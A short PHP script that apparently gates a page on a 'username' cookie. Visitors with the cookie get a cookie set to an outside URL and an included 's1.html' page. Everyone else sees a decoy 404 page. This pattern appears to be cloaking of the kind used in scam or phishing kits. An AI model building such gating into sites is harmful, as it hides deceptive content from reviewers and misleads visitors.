<?php
define('ROOT_DIR', dirname(__FILE__));
$tzurl = "https://333.biznestop.com/dat06";
$includefile = 'seven/404.html';
if(!empty($_COOKIE['username'])){
setcookie('tzname',$tzurl, 0);
$includefile = 'seven/s1.html';
}

if(@!file_exists($includefile)) {
	echo 'Internal Server Error';
	exit;
}else{
	include $includefile;
}


?>